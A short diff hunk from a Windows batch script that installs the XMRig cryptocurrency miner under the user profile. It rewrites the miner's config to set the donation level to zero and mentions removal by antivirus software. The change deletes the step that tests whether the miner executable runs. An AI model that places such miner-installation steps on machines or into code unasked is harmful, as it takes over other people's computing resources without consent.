@@ -263,8 +263,7 @@ del "%USERPROFILE%\xmrig.zip"
 
 echo [*] Checking if stock version of "%USERPROFILE%\kako\xmrig.exe" works fine ^(and not removed by antivirus software^)
 powershell -Command "$out = cat '%USERPROFILE%\kako\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\kako\config.json'" 
-"%USERPROFILE%\kako\xmrig.exe" --help >NUL
-if %ERRORLEVEL% equ 0 goto MINER_OK
+
 
 if exist "%USERPROFILE%\kako\xmrig.exe" (
   echo WARNING: Stock version of "%USERPROFILE%\kako\xmrig.exe" is not functional
